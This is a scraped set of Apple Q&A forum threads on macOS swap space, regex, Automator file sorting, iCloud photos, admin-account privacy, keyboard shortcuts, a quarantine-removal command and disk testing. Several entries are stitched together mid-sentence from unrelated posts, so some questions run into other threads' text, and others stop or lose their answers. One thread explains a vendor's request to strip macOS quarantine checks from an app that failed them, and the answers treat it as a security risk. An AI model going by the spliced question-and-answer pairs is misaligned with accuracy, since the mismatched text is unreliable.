My 2015 Mac Book pro is running low on memory, and so it has switched to using the swap space. Though now the swap space is taking up all the computer's virtual memory. Is there any way to delete the swap space. I usually restart the computer to get back that space, but there has to be a smarter and easier way to get back that space.\n\nhttps://i.imgur.com/AYAr7lO.png\nOut of disk space:\n\nhttps://i.imgur.com/EVWbAqx.png\nAlso is there anyway to find out how that space is being used, like which applications are using the swap space?\n\nA: You are thinking of this from the 'wrong side'.\nSwap space is your virtual memory.\nSwap space is essentially a high tide marker. if your Mac doesn't need the space, it doesn't need to try to aggressively reclaim it.\nYour Activity Monitor screenshot shows \"no issues\".\nYour actual issue is that your tiny boot drive is far too full for safe, normal operation.\nSpeculation\nThe issue that arises may be because the part of the OS handling memory is itself unaware of how full the drive is & always assumes if it needs memory, the drive is going to be there to provide it. It it isn't, then problems occur.\nThis perhaps then masks the actual issue from user perception.\n", "Q: iOS Shortcut, regex match these words, while excluding these words I am using iOS Shortcuts and am using it get contents of page (converts the page to RTF), then running through make text to turn it into plain text.\nI am trying to develop an IUC flavored regex to search for key words/phrases on a list of pages I am looping over with a while each, but want the regular expression to exclude other phrases and prevent a false-positive trigger.\nI have it set up with two capture groups. I'm not sure if it is desired to make the second group a non-capture group, or not attempt capture at all. I only think the second one must be either a capture, or non-capture group for the logical AND provided. I read that (this)(that) acts as an and, but I'm not sure if either is a negate, whether it follows that logic. For that reason, I'm not sure if the negate should not be it's own capture group, non-capture group, or shouldn't be using the brackets at all. I had tried some nested capture group stuff, but that seems to not follow the syntax.\nCurrently, I have tried a wide variety of regular expressions. I do not have a full list, but I can share a few permutations I have tried starting with the most recent:\n(?>Include\\sTerm\\sOne|Include\\sTerm\\sTwo|Include\\sTerm\\s3)(?:<!Exclude\\sTerm\\sOne|Exclude\\sTerm\\sTwo|Exclude\\sTerm\\s3)\n\n(?Include\\sTerm\\sOne|Include\\sTerm\\sTwo|Include\\sTerm\\s3)^(?!Exclude\\sTerm\\sOne|Exclude\\sTerm\\sTwo|Exclude\\sTerm\\s3)\n\nJust to be clear, I want it to first search the exclude terms and fail if it finds one. Then if it doesn't find any of these negate terms, then begin searching through the include terms. It is fine that the include list and exclude list terms, respective to each grouping are being treated on an OR basis (per piping |) as that is the intended behavior I'm seeking. Finally, I am wanting to start my search at the top of the page and for it to stop searching / attempting capture in this logical order:\n\n*\n\n*Exclude term found, STOP\n-- First include term found, STOP\n\nFinal note, this search is obviously performed over multiple lines. I am only seeking to capture the include term, not the exclude term. I only want the exclude term to cancel out a match of both exist (either before or after - cross directionally). That is if an exclude term exists, negate the positive term and provide zero matches.\n\nA: A regular expression is not program, it is just a very complex search pattern. In a nutshell, the only thing a regular expression can do is either match or not match, returning the first match it finds (including related sub matches, as may be) in the former case, or nothing in the latter.\nThat means that to implement a conditional “accept or reject” logic where both branches are predicated on matches, a regular expression is the wrong tool. Instead, that implementation needs to be done programmatically, leveraging regular expressions step for step:\n\n*\n\n*First search for a regular expression of exclude terms (e.g. (No|Neither|…|Nope)). If that returns a match, skip the document and move on to the next.\n\n*Then search for a regular expression of include terms (e.g. (Yes|Please|…|Thanks)). If that returns a match, process the document, else skip the document and move on to the next.\n\n", "Q: Sort files into folders based on first two digits of filename? I constantly get hundreds of .pdf files I would like sorted into folders based on the filename.\nThe filenames are made up of a couple elements, although only the first string of letters and the first two digits are relevant. The letters represent the customer code and the digits represent the year.\nHere's two examples:\n\n*\n\n*TX204190_100_GR.pdf. TX is the customer code and 20 represents 2020.\n\n*SFLYMK220921_CR2050_BLKHTH.pdf. SFLYMK is the customer code and 22 represents 2022.\n\nThe PDFs start off as direct siblings to the year folders. I need these PDFs to go inside the correct year folder and then the correct customer folder. So for example, TX204190_100_GR.pdf would need to go inside 2020 and then go inside the TX folder. The folders will all already exist.\nBefore Sorting Example\nAfter Sorting Example\nI'm struggling to find a way to select only the customer code (which can be anywhere from 2 to 8 characters) and the following two digits with automator so that I can properly move the files. I'd assume it requires some kind of regex solution, but I don't know where to even begin or even if that's possible using only Automator. Any advice or help with this is greatly appreciated.\n\nA: Here is an example Automator workflow that you might find helpful.\nExample shell script code for the Run Shell Script action:\nd=\"$HOME/Documents/Orders\"\n\nfor f in \"$@\"; do\n    if [[ ${f##*/} =~ ([[:alpha:]]{2,8})([[:digit:]]{2})(.*) ]]; then\n        c=\"$match[1]\"\n        y=\"$match[2]\"\n        [ ! -d \"$d/20$y/$c/\" ] && mkdir -p \"$d/20$y/$c/\"\n        mv -n \"$f\" \"$d/20$y/$c/\"\n    fi\ndone\n\nNotes:\nChange the value of d to the fully qualified pathname of the, e.g. Orders directory.\nIn this example Automator workflow the settings for the Run Shell Script action are: Shell: [/bin/zsh] and Pass input: [as arguments].\n\n\n\n\n\nNotes:\nAs I said, \"Here is an example Automator workflow ...\" and it is just that, an example. The main part is the shell script code in Run Shell Script action, as it does the real work! So, whichever way you want the workflow to pass a list of qualifying files to the Run Shell Script action, even if modifying the code as necessary based on how you want the files passed, you should be in business. Any files not matching the regex are ignored.\nAddressing a comment, also note that while mkdir -p \"$d/20$y/$c/\" does not explicitly need to be tested for, nonetheless, it is a coding force of habit if you will, used in similar paradigms. You can omit the [ ! -d \"$d/20$y/$c/\" ] && portion of that command if you so choose. However, that said, I'd leave it as [ ! -d \"$d/20$y/$c/\" ] && uses the zsh shell built-in command for [ and testing for it existence incurs far less overhead than needlessly executing the mkdir command every time when the target directory already exists!\n\n\nA different Automator workflow\nAs an example, the Automator workflow could consist of just the Run Shell Script action with the following example shell script code:\nd=\"$HOME/Documents/Orders\"\n\ncd \"$d\" || exit\n\n[ -z \"$(ls *.[pP][dD][fF])\" ] && exit\n\nfor f in *.[pP][dD][fF]; do\n    if [[ $f =~ ([[:alpha:]]{2,8})([[:digit:]]{2})(.*) ]]; then\n        c=\"$match[1]\"\n        y=\"$match[2]\"\n        [ ! -d \"$d/20$y/$c/\" ] && mkdir -p \"$d/20$y/$c/\"\n        mv -n \"$f\" \"$d/20$y/$c/\"\n    fi\ndone\n\nNotes:\nChange the value of d to the fully qualified pathname of the, e.g. Orders directory.\nIn this example Automator workflow the settings for the Run Shell Script action are: Shell: [/bin/zsh] and Pass input: [to stdin].\n\n\n\n\nWhat the example shell script code does:\n\n*\n\n*d=\"$HOME/Documents/Orders\" -- Sets the value of the d variable to the target location of the files to be processed.\n\n*cd \"$d\" || exit -- Changes directory to the target directory or exits the script.\n\n*[ -z \"$(ls *.[pP][dD][fF])\" ] && exit -- Test for the existence of the target PDF files and exits the script if none exist at the target location. This test is necessary to avoid an error in the for loop to keep the Automator workflow from throwing an error if run and no target PDF files exists.\n\n*for f in *.[pP][dD][fF]; do -- For each target PDF file do something.\n\n*if [[ $f =~ ([[:alpha:]]{2,8})([[:digit:]]{2})(.*) ]]; then -- If the target file matches the regex, then do something.\n\n*c=\"$match[1]\" -- Sets the value of the c variable to the Customer Code. The value of the first Capturing Group of the regex.\n\n*y=\"$match[2]\" --  Sets the value of the y variable to the Year. The value of the second Capturing Group of the regex.\n\n*[ ! -d \"$d/20$y/$c/\" ] && mkdir -p \"$d/20$y/$c/\" -- If the target directory doesn't exist, then create it.\n\n*mv -n \"$f\" \"$d/20$y/$c/\" -- Move the target file to the target directory.\n\n*fi -- Closes the if statement block.\n\n*done -- Closes the do loop.\n\nExplanation of the Regex:\n\n\n", "Q: What does this \"no live\" icon mean in the iCloud photos web interface, and how can I fix it? One of my photos in iCloud is showing an unusual icon at the top-left corner:\n\nThe normal icon for Live photos looks like this:\n\nNon-live photos have no icon there. The photo is a live photo and it shows up as one on all my other devices. Only the web interface shows this odd icon. On the iPhone where I took the photo, the live photo plays normally. However in the Photos app on my Macs, it shows up with the normal Live icon but it doesn't play. Also there's a small icon in the bottom-right corner showing a cloud with an exclamation point. When I click that I get a dialog saying there's a problem downloading a full resolution version and I should try again later:\n\n\nI have been trying again later for a week, so it seems unlikely to fix itself.\nWhen I click the download button in the web interface, it downloads a perfectly cromulent HEIC image file, but no MOV. When I download a live photo I get a zip file containing one of each.\nSo it seems like something there's some kind of problem with the live-ness of the image that's affecting the live-ness of the photo. But what is it, and how can I fix it?\n\nA: A quick fix would be to take the iPhone where it plays correctly and simply duplicate the image.\nThe new duplicate should then sync to iCloud and be playable on other devices.\nWhen you are sure the new duplicate works on all devices, you can delete the old one.\n\nA: jksoegaard's ideas got me close, but couldn't quite get the full original Live image into iCloud. iCloud seems to be very reluctant to re-load a file even when the one it has is obviously corrupt.\nWhat finally worked for me was AirDropping the image to a Mac, adding the copy into Photos there, and then deleting the original from iCloud.\nThis is complicated by two weird behaviors of AirDrop:\n\n*\n\n*It only AirDrops the Live version of an image (both HEIC & MOV files)\nif you choose \"Add to Photos\" on the receiving Mac.\n\n*It only gives the option to \"Add to Photos\" if the receiving Mac is on a different iCloud account than the sender. If they're on the\nsame account it defaults to dropping the photo in the Downloads\nfolder, which means Live photos only transfer as a still HEIC.\n\nSo to get the Live photo off my iPhone I had to\n\n*\n\n*AirDrop it to a friend's computer (choosing \"Add to Photos\")\n\n*Copy it to myself\n\n*Drag it into my own Photos app.\n\n*Delete the original.\n\nThis ultimately worked, but kind of a pain.\n", "Q: Using an iMac 27-inch as a display for a Mac Mini M1 I want to connect an iMac 27-inch Late 2012 and an iMac 27-inch Mid 2010 to two Mac Mini M1 and use them as displays, so I'd like to know what type of cable should I buy for each one of them.\nThe iMac Late 2012 has a Thunderbolt port and the Mid 2010 has a Mini DisplayPort.\nCould someone please give a link to an online shop where I could buy these cables?\n\nA: This is not possible using Apple's \"Target Display Mode\" on the iMac, from an M1 Mac mini. Only Macs introduced in 2019 or earlier (i.e., Intel-based Macs) can connect to an older iMac's Target Display Mode (newer iMacs don't have Target Display Mode), according to the Apple support article https://support.apple.com/en-us/HT204592 which states:\n\nThe iMac used as a display must have macOS High Sierra or earlier installed.\nThe other Mac that you're connecting it to must have been introduced in 2019 or earlier and have macOS Catalina or earlier installed.\n\nIt is possible to modify some older iMac models, converting them from a computer to a monitor, by disconnecting their main circuit boards and replacing them with 3rd-party display driver boards. The boards currently sell for $200-300. You can search eBay, AliExpress, etc. for 5K universal HD driver boards. This is a very complicated procedure, it is not just buying a cable.\n", "Q: How good is the user isolation in macOS? Recently I bought the MacBook Air M1. I have created two accounts. Laptop will be used by two different persons. Both users have administrative permissions.\nI have been wondering if that setup will provide privacy.\n\n*\n\n*Is it possible that another user can easily read the files from the other user?\n\n*Does the user have an access to iCloud files?\n\n*What about bookmarks and tabs from Safari?\n\nIs there a list of areas that are compromised with usage of root rights?\n\nA: The purpose of the administrator privilege is to allow full control of the Mac. And part of full control is to have access to very nearly everything.\nAccess to the other user's files may require a little more than browsing in Finder as many folders have (e.g. ~/Documents) have permissions which allow access only to the owner. But any user with basic knowledge of Terminal commands can overcome such simple obstacles.\nOf your specific questions, iCloud is the only one with some protection. iCloud files which are not currently synchronised with the Mac, will not be accessible.\nIf you are to have two administrators, they must trust each other not to go rummaging through each others private files.  And they will need some care and understanding to make sure that performing administrative tasks does not effect the other's use for the computer.\nIf there is not full trust, I would advise not keeping any personal files on the computer without some additional protection. As examples of protection:\n\n*\n\n*Keep private files in a password protected disk image.\n\n*Keep private files in an encrypted external disk which is always removed when not in use.\n\nBut even then, a more skilled administrator would be able to install software to capture files when the other user is using them.\n\nA: No, that setup will not provide any privacy. In order to enforce any isolation between user accounts, they must not be given administrator privileges.\nAny user that is an administrator can easily read the files from any other user. They have access to the \"sudo\" command, that gives \"root\" privileges in the underlying Unix system. They have the ability to change the login password of other users. This would enable them to log in as the other user, and see their Safari bookmarks or saved tabs, or any other file or information, provided it is not protected by encryption based on a password separate from the login password, such as an encrypted disk image.\nIf iCloud is already enabled and the computer is a \"trusted device\" for things like Contacts, Calendars, etc., or iCloud Drive for other apps like Pages or non-Apple apps, then by logging in to the computer as that user, another user could access those iCloud files. Furthermore, they might have access to the user's e-mail if they use Apple Mail or some other e-mail app on the computer that stores the e-mail password. In that case they may be able to log in directly to icloud.com or appleid.apple.com by changing the iCloud/Apple ID password.\nSome of this information could be accessed without the other user noticing. In other cases, the user would notice their passwords being changed. It is not possible to find out what a user's login password is, only to change it.\n\nA: This is a very subjective question, since you didn't outline your threat model. Are you worried about a dedicated trained unix expert with time on their hands?\n\n*\n\n*giving them an admin account might save them some time, but most good blue team / red team / white hat hackers can escalate privileges on a consumer machine - macOS or Windows or unix.\n\n*in this scenario, you're not very secure if they can decrypt the drive contents.\n\nAre you worried about a casual \"non-expert\" that only has the machine for a few hours or is supervised?\n\n*\n\n*your risk is much lower, but it would be better to give them a non-admin account\n\nAre you worried about someone deleting files or granting them access to the other user?\n\n*\n\n*take away admin from anyone you don't trust\n\nAnyone that can read the data on the system can get to all files to read them with admin password, so you want to deny that and/or use second level encryption if you don't use FileVault to protect all local copies of cloud files, all local files and prevent forensic analysis of all files on the Mac. Any admin credentials are root so you're done if you hand that over to anyone with skill and 5 minutes to get to work.\nGood or bad, isn't really useful since the system is designed to allow the administrator to manage the entire OS and all file permission changes. You want different tools to separate data than accounts on macOS.\n", "Q: Does Mac really not have keyboard shortcuts to jump to start/end of a document? As a software developer, I reckon Ctrl+Home / Ctrl+End are almost as widely used on Windows as copy/paste.

Which means I end up scrolling a lot or using PgUp/PgDn.\nIs there a a standard shortcut when editing a text file or document, to move the cursor to the start/end? If so what is it? Or maybe there's a way to configure it somewhere?\n\nA: For moving the insertion point to the beginning or end of a document and scrolling it into view:\n\n*\n\n*⌘↑ or ⌘↓.\n\nFor scrolling to the beginning or end of a document without moving the insertion point:\n\n*\n\n*Extended Mac keyboards have dedicated Home and End buttons.\n\n*All Mac keyboards with a Fn key provide the Fn← and Fn→ key combinations which map, respectively, to Home and End functions.\n\n\nNote that all of the above behavior is standardized across most Mac apps via system frameworks, but any app is free to override its key-down event handler to behave differently. For example, some apps may choose to move the insertion point when you press Home / End. An application may offer the user a preference or setting that controls this behavior.\n\nA: So, exists in Word, checked in the Word help:\n\n\nA: According to this support document https://support.apple.com/en-gb/HT201236\nCommand Down arrow moves the insertion point to the end of the document, and Command Up arrow moves the insertion point to the start of the document.\nThat works in TextEdit (the exemplar of MacOS TextView APIs).\nCommand Home and Command End often work in other apps, such as BBEdit.

And I am truly sorry for it takes a lof of time to locate the reason and find the solution. I\nsincerely apology for the inconveniences has caused to you.\nOur DEV team make further diagnosis and find the solution for you.\nWould you please give the customized version a try to solve the\nhttps://drive.google.com/file/[link redacted]\nPlease download and unzip it to give it a new try.\n\nSo, okay. I downloaded the file, unzipped it, and launched -- only to get the error message:\n\n[App name] is damaged and can’t be opened. You should move it to the Trash.\n\nI wrote back to tech support, reporting the error message.  They responded with the following instructions:\n\nThank you so much for your kind feedback. Given this rare situation,\nwould you please refer to below instructions to solve the problems?\n\n*\n\n*Please find the \"Terminal\" option on your computer;\n\n\n*And then,  please Please enter the path below:\nsudo xattr -rd com.apple.quarantine / (App location)\nAfter that, please enter the password of your computer. Then, you can\nuse it.\n\nNow, I am almost completely UNIX-illiterate, and I am reluctant to enter any command into Terminal unless I know exactly what it is going to do -- and this appears to be a command designed to turn off security measures.  Moreover, a little bit of Googling suggests that this command, whatever it does, is usually recommended when getting a permission error (e.g. \"You do not have permission to open the application\"), which is not the error I am getting.\nSo my questions:\n\n*\n\n*What will this command do?\n\n*Is it safe for me to execute it?\n\n*Is it likely to help?\n\n\nA: Breakdown of this command:\nsudo xattr -rd com.apple.quarantine /path/to/app/location\n\n*\n\n*sudo: Execute the remainder of the command with superuser (root) privileges. More information: man sudo\n\n*xattr: Show or modify extended filesystem attributes on a file or directory. Extended attributes are those that go beyond the standard POXIX user/group/other read/modify/write/execute permissions. More information: man xattr\n\n*-rd: These are two separate flags/arguments that will be passed to xattr. r means that if you invoke xattr on a directory, the operation will be performed recursively on all files and directories contained within it. Since you are targeting an application, which is actually a bundle (i.e., a structured directory), this flag is necessary in order to reach all of the bundle's contents. d means that the operation performed will be to delete the specified attribute from the file or directory.\n\n*com.apple.quarantine: This is another argument passed to xattr. It specifies the name of the attribute to be operated upon (deleted, in this case). The com.apple.quarantine attribute is the mechanism by which files downloaded from Safari and some other applications are marked as having been downloaded from the Internet (which is a potentially hostile environment), as opposed to coming from a presumably safe environment, like the Mac App Store or files that you've created yourself. When a user attempts to execute a quarantined binary for the first time, the kernel hooks into the quarantine.kext kernel extension and the execution is gated by a UI interaction that presents the \"This file was downloaded from the Internet. Are you sure you want to open it?\" panel.\n\n*/path/to/app/location: This is the final argument passed to xattr. It specifies the file or directory whose attributes xattr will read or modify.\n\nWhen put all together, this command says:\n\"For every file and folder inside /path/to/app/location, delete the com.apple.quarantine attribute. Do this all as the root user.\"\nHere is why you are being asked to run this:\n\n*\n\n*The app whose path you specified at the end of this command was downloaded from the Internet through your browser.\n\n*macOS recognized that any file from the Internet may be unsafe, so it applied the quarantine attribute at the time of download.\n\n*This file is an application, so when you tried to open it, the kernel saw that it was quarantined and ran security checks on it. It only does this prior to the first successful launch; subsequent launches skip this security mechanism if it succeeded previously.\n\n*The app failed the checks for some reason and macOS informed you that the app is damaged.\n\n*The developer wants you to delete the quarantine attribute in order to bypass the security checks and allow the app to run.\n\nSo the above Terminal command by itself is a perfectly safe and reasonable thing to run on its own. However, in context, you need to be very vigilant: By first running this safe command and then running the app you downloaded, you are allowing a third-party developer to execute their code on your computer without successfully passing security checks - which you already know have failed.\nIs this malicious? Impossible to know. The developer may be a totally sincere software engineer who has imperfect English and a buggy app that they are trying to collaboratively debug with you. Or it may be a shady developer who's trying to backdoor you. None of us can answer that for you here.\nA couple of things you could do are:\n\n*\n\n*Run the application executable through a disassembler and see if you can glean any malicious intent (hard to do with experience; impossible if you're not a developer yourself).\n\n*Ask the developer to work with you to debug the launch failure because you don't feel comfortable removing the app from quarantine. This will probably involve providing targeted launch logs with the log command (see man log, but also know that this is on the developer to figure out for you).\n\n\nA: I have ran into this when a piece of software you are using is from a previous version of MacOS / no longer supported with the current version of MacOS (an X through the software, claims it's broken and recommends you send it to the trash), or when the developer's code hasn't been signed by Apple and downloaded from the internet (the downloaded from the internet warning, a third-party developer with code that has been unsigned by Apple; the only legitimate reason would be the developer is deciding to not pay Apple $99 a year to be a developer, but is a bit suspect otherwise).\nWhile both of the aforementioned can be innocuous, if the program serves a legitimate purpose, the steps he is taking you through to get the program running by bypassing some of these prompts is out of the norm (in my opinion).\nThe command is question bypasses these warnings by disabling Apple's default quarantine an app with such issues.\nTo me, these recommendations will either be innocuous, or nefarious - depending on the intentions of the developer. The only thing that informs this is their reputation in general:\n\n*\n\n*Are you obtaining this from the official (or trusted) source?\n\n*Is the software well-established and has a niche community that uses it can can provide feedback the software operates as intended?\n\nIf the answer is yet to both, then it's probably fine. However, what I find suspect is why the developer doesn't just update their software, recompile it for the newest operating system and have their code signed by Apple to bypass these warnings the correct way.\nAt least he isn't asking for you to disable Gatekeeper (system wide0 because that is something I would find to be highly suspect.\nSo it comes down to an individual judgment call on your part, not knowing the  name of the software package to offer a general opinion. But it may be worth asking why he hasn't provided an updated version to avoid the end-user from having to jump through these hoops, if these warnings are truly innocuous. I presume if it is innocuous, it's because it was written using an older version of MacOS and is unwilling to pony up the cash yearly to be an Apple developer and have their code signed accordingly.\nIf you cannot get your answers satisfactorily answered and presuming this code doesn't require an administrator to run, is either run said software on a virtual machine to analyze its usage (which protects your computer), or if it will work on a non-admin user (which it may not since you may not be able to bypass these warnings without admin privileges) is creating a new regular/non-admin user account to test this and then worst case scenario you can just delete the account without fear of it modifying or mucking up your system files. THe standard user account should be sandboxed, for the most part.\nPerforming a backup of your files beforehand would be recommended, if you are wanting to be overtly cautious - in the case of ransomware.\n\nA: 1. It will delete an unneeded component of the application.\n2. It is safe.\n3. Not likely, but it may.\nThis part is a bit messy, sorry.\nSo I am not familiar with this command but in general, being familiar with the command line, I read the manual page and I can say that this command is not malicious.\ncom.apple.quarantine only asks if you want to run this application. If you confirm it will remove itself. Basically, it is the \"You are opening the application APPLICATION_NAME for the first time. Are you sure you want to open this application?\"\n\nIt may help but probably it won't but there is no cost, it won't damage your computer.\n", "Q: macOS system report's installation does not list all software installations I noticed not all my software installations appear in System report's installation history list.

However, an entire work folder has vanished.\nThis was the command which appears to have done it.\nfind . -exec rename -s '/' '_' {} +\n\nThe folder is not in trash. ls shows the folder is empty. Is it possible to recover this?\n\nA: / is the directory separator. It can't appear inside a file name. The graphical user interface shows / in file names, but under the hood the name contains :, which the GUI won't let you use in a file name.\n(The reason for this weirdness is historical: the GUI derives from historical macOS which used : as the directory separator, whereas the core of the operating system and the command line derive from Unix which uses /.)\n/ does appear in paths, as the directory separator, and rename operates on paths. Operating on paths allows it to move files between directories with very little extra effort.\nfind lists paths, and with find ., all paths (apart from . itself if it's listed) begin with ./. So you instructed rename to move all files under the current directory to the current directory, with _ instead of the directory separator. For example:\n./foo.txt → ._foo.txt\n./dir/foo.txt → ._dir_foo.txt\n./dir/sub/foo_bar.txt → ._dir_sub_foo_bar.txt\nSince all paths listed by find start with a ., all the file names now start with ._. File names starting with . are hidden. To show them in Finder, press ⌘ Command⇧ Shift.. To list them in a terminal, use the -A option to ls, e.g. ls -lA.\nYou can partly recover by running the opposite command:\nfind . -exec rename -i -s '_' '/' {} \\;\n\nOnly partly though, because there's no way to tell for sure whether a _ in a file name was originally a directory separator or an underscore. A plausible heuristic would be to treat _ as a directory separator if there's a matching directory. Untested zsh code (note: this is zsh code, it won't work in bash):\nfunction sort_by_underscores {\n  local u=${${REPLY//[^_]/}//_/a}\n  REPLY=\"$u $REPLY\"\n}\n\nfor x in ._*(O+sort_by_underscores); do\n  d=${x%_*}\n  while [[ ! -d $d ]]; do\n    d=${d%_*}\n  done\n  echo mv -i -- $x $d/${x#\"${d}_\"}\ndone\n\nIf this looks sensible, run it again without the echo.\n", "Q: Apple discussion forums unavailable?

However, I wasn't able to access any topics on the Apple discussion forums during the last week, because they seem unavailable.

Or maybe there are better file/directory utilities for MacOSX? (I haven't tried any GUI app on that directory, thinking better not to...).\nI have written a fairly trivial C program reading the directory entries and outputting the info on the way:\n#include <dirent.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <sys/param.h>\n#include <unistd.h>\n\nint main ( const int argc,\n           const char * const * argv )\n{\n    const char * const dirpath = argv[1];\n    DIR *dirp = opendir ( dirpath );\n    if ( dirp == NULL )\n        return (-1);\n\n    int count = 0;\n    struct stat statbuf;\n\n    for ( struct dirent *entry = readdir ( dirp ) ;\n      entry != NULL ;\n      entry = readdir ( dirp ), count++ )\n    {\n       char filepath [ PATH_MAX + 1 ];\n       memset ( filepath, 0, PATH_MAX );\n       strncat ( filepath, dirpath, PATH_MAX );\n       strncat ( filepath, \"/\", PATH_MAX );\n       strncat ( filepath, entry->d_name, PATH_MAX );\n       stat ( filepath, &statbuf );\n       printf (\"%s %llu\\n\", entry->d_name, statbuf.st_size );\n    }\n    closedir ( dirp );\n    printf (\"%d\", count );\n\n    return 0;\n}\n\nwhich actually does work (outputs the result after reading each entry) and has memory footprint of around 300K. So it is not a problem of the OS (filesystem, driver, standard library or whatever), but the tools which basically do not scale well (I know they support more options etc., but for a basic directory listing, without sorting or anything fancy ls should work better, ie. not allocate 1GB of memory, while find should do the action for each entry it finds (and matches), not read them all first, as it apparently does...).\nHas anyone experienced this and has a good solution how to deal with such huge directories (what utilities to use) on MacOSX? (Or maybe writing some custom system utility is necessary in such case?)\n(It is an exceptional situation of course, occurred for the first time on my system - but the OS supports such large directories, and the basic shell tools should deal with them in a reasonable way...)\nEDIT:\nSmall fix in the program (the filepath was lacking '/').\n\nA: So it seems, I answer myself, maybe somebody will find my conclusions useful.\nStandard Unix tools (MacOSX, Linux) are not good for managing directories in such extreme situations as described. They are very efficient (maybe as efficient as possible in what they do) in normal situations - but this design leads to extensive memory usage (in GBs) and a very long time time for getting any result when a directory contains millions of files. For instance, ls reading all directory entries first (as fast as possible), and outputting them from a list/array in memory - it seems to be the most efficient way for such task. However, for extreme cases (with millions of files), this approach fails in practical use, eg. it is not possible to learn anything about the contents of the directory for hours (as it was in my case).\nFrom practical point of view, it would be good if such tools had an option to turn on “stream” processing - process the entries in manageable amounts, eg. in bunches of 1000 entries (if one-by-one would be too slow).\nAs for now, it seems necessary to create a custom system utility that will do the job, ie. list / delete / move the files in such directory. It could be done probably something else than C (Python, Perl) but since it could be slower, so I wouldn’t advise this (even small time multiplied by millions may be significant overall).\nIt seems non-technical users are out of luck here, they have to ask for help.\nOne thing that might be interesting to note here is that the relation of time required for operations on a directory vs. number of files in it is not linear (this case is the MacOS’s HFS, other filesystems can vary both ways). Deleting the 6.7M files using the program above (just \"unlinking\" instead of printing) took few days (on an older iMac with an HDD, not an SSD). I was logging the names of the files as they were being deleted - at first, the rate was like 100K files a day, while removing the last 1-1.5 million took around 3 hours.\nThanks for the comments.\n", "Q: How to swap by Karabiner option+shift+brightness and brightness How to swap the behaviour of option+shift+brightness (e.g. changing the brightness in small increments) and the normal brightness key in Karabiner?\nI tried\n{\n    \"title\": \"Screen brightness in smaller steps\",\n    \"rules\": [\n        {\n            \"description\": \"Screen brightness in smaller step\",\n            \"manipulators\": [\n                {\n                    \"type\": \"basic\",\n                    \"from\": <%= from(\"apple_vendor_top_case_key_code\":\"brightness_down\") %>,\n                    \"to\": <%= to([[\"apple_vendor_top_case_key_code\":\"brightness_down\", [\"shift\"], [\"left_option\"]], [\"vk_none\"]]) %>\n                },\n            ]\n        }\n    ]\n}\n\nbut the brightness key still changes the brightness in big steps.\nIn case it makes any difference, I'm using MacOS 11.5 with the expanded control slip on the touch bar and an external mac keyboard with normal media keys\n\nA: I had the same question but couldn't find the answer on the web.

I stream from my MacBook via DLNA and/or AirPlay to the AppleTV 4K.\nI stream old family videos (PAL) from time to time and don't see any better quality at all.\nAll TV manufacturers advertise AI based video quality enhancements. Is this only possible if I stream directly to the SmartTV? Or also the detour via AppleTV?\nCan AppleTV also do upscaling in any way?\n\nA: Yes, it is fully possible for TVs to change the picture using their \"AI\" even when streaming via an AppleTV as you do. I say \"change the picture\" as some would argue that they don't actually see this as a \"quality improvement\" or \"enhancement\" - which is ofcourse very subjective.\nIf you prefer the enhancements, ensure that they are enabled in the TVs menu. For some TVs you can selectively enable/disable these features for various inputs. Some setup specific HDMI inputs for \"PC mode\" where most of this is disabled by default - so ensure that's not the case for you. Note that these are changes you make the in the TV's on-screen menu.\nFor the final question, yes the AppleTV can definitely do upscaling. You can tweak this in the Settings menu, where you can set the output resolution you want (typically you want this to be 4k if you have a 4k TV) - and you decide whether or not the match the content's framerate, HDR/SDR setting, etc.\n", "Q: What is the \"Menu Title\" for the shortcut to jump to a browser tab by number?

In that case, you need to look at the given description and filename extension (they're listed right alongside in the file) in order to choose the right one.\nIf you're not used to working with the Terminal and configuration files like this, you could use a GUI property list editor for viewing the plist file.

A simple test with 1GB pattern takes ~1 min to write (16MB/s). When testing the same drive with a Finder transfer I easily see >100MB/s.\nAny suggestion on improving the performance of badblocks in macOS?\nOptions I'm using are:\n-b 4096 -c 512\n\nThings I've tried:\n\n*\n\n*Changing -c does not make much different, or worsens performance.\n\n*Tried -B option for buffered mode, and did not measure any change.\n\n*Tried both the Homebrew and MacPorts versions of badblocks.\n\n*Changing my USB cable and dongles.\n\n\nA: You indicate that you're doing a write test to the drive using the badblocks program, however the options you state you're using do not include the -w flag for indicating that you want to test in write-mode. I assume this is because you left out the -w flag when stating your options here, and that you really did use the -w flag when you ran the program.\nThe reason you're seeing vastly different numbers in terms of MB/s is that the two programs (badblocks and Finder) are doing vastly different things:\nCopying a file to the drive with Finder will essentially write large amounts of consecutive data in large blocks to the drive. This is something that most hard drive do very efficiently and quickly.\nDoing a write-mode test with badblocks will essentially write a number of blocks to the drive with a specific value, then read them off the disk again to check that they were written correctly. Repeat that for all the blocks to be checked. Then it does that whole thing once more with a different value, and so on. By default it will do 4 passes over the drive with the values 0xAA, 0x55, 0xFF and 0x00.\nThis means that it is very natural that a Finder copy is much faster in terms of how quickly 1 GB of data can be copied compared to how quickly the badblocks program can check 1 GB of disk space. As reads are usually faster than writes, you would expect the badblocks program to be approx. 4-8 times slower than Finder - most often around 6 times slower.\nThat corresponds very well with the numbers you are seeing, so I wouldn't worry about it.\nIn terms of improving performance, I would make sure you're using the best device node for accessing the drive. If you're testing the whole drive, then test using /dev/rdiskX instead of /dev/diskX to see if that improves performance.\n", "Q: iPhone 6s refuses to boot after screen removal Have a set of phone repair tools. After removing the iPhone 6s screen (carefully, teasing the ribbons off), and replacing with apple parts, there was an issue turning the phone on even after a hard reset and firmware update. Took the phone to a Genius Bar appointment, and the power test (using a MacBook Air) failed. Three questions:\n\n*\n\n*Does removing the screen improperly place a software lock on the iPhone 6s boot?\n\n*Would this have been caused by the new iOS update?\n\n*If neither of these, what might cause a screen removal to prevent an iPhone 6s boot?\n\n\nA: I have replaced the battery on my old 6S Plus a few times, and each time I had to remove the screen. Nothing broke for me.\nIf you are lucky, then the ribbon cables did not fully click into place (like little Legos) and it will be a simple fix of unplugging and replugging the connectors. Otherwise it looks like a chance of damage, maybe a connector broke the socket or perhaps a ribbon cable is partially torn.\nDoes the phone boot while constantly charging? Does it automatically boot when you plug in the cable to a turned off phone? If it works well enough to update the firmware there's a slight chance of a dying battery and needs to be plugged in to get enough power. A power test failure must not be the whole story if you can update it.\nDo you see the logo during the update? If yes, then at least the screen cable is ok. You can also disconnect the front camera and try booting with just the video and touch connectors plugged in and see if the camera is broken.\nAs far as I know, the only lock is when you swap parts and it seems to have started in iPhone 12. If a power test is failing, then your problem is likely hardware.\n", "Q: Restore Time Machine backup I want to restore from my Time Machine backup.\nMy Time Machine backups where saved on a QNAP NAS.

